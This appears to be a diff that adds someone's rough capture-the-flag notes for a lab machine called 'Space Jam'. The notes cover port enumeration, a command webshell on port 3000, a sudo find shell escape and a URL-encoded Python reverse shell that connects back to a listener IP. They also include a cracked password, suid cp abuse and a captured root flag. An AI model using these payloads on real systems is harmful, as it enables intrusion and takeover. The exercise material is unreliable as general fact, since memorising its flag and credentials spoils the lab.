@@ -1,0 +1,44 @@
+Space Jam:
+22 (ssh)
+23 (linux telnetd)
+/usr/lib/telnetlogin has suid bit set
+spacejam is the user
+80 (apache webserver)
+3000
+found webshell cmd prompt?
+http://10.10.114.179:3000/?cmd=
+from this I found jordan’s easyaccess.py
+run it if not already started
+61432 (jordan)
+nc spacejam.thm 61432
+start easyaccess.py if not started
+can execute find command as sudo with no password
+sudo find . -exec /bin/sh \; -quit
+whoami; root
+
+bunny
+got password after root via john bruteforcing, its carrot123
+This is a restricted shell, cannot pipe outputs or change directories
+ls symbolic link in /home/bunny/ls?
+this appears to be the user that is running the 3000 webshell
+postgres
+can run “pg” as sudo with no password
+there is a mysql server running on localhost:3306 and postgress something on localhost:5432
+not sure how to exploit, but if you can get the postgres user you can get root.
+root
+no way…
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+http://10.10.244.99:3000/?cmd=cd%20/home/jordan;%20export%20RHOST=%2210.6.15.130%22;export%20RPORT=4444;python%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
+nc -lvp 4444
+cp vulnerabilities (priv esc)
+/bin/cp has suid
+cp /root/root.txt /dev/stdout
+218f5ea7a4d711eef60171e5c92ba9e1
+vim /tmp/exploit
+(Revshell goes Here)
+chmod 777 /tmp/exploit
+cp --attributes-only --preserve=all /bin/cp /tmp/exploit
+didnt work
+chattr drama
+some douche set the file to be immutable and deleted chattr and busybox
+upload the chattr program in resources and add perms
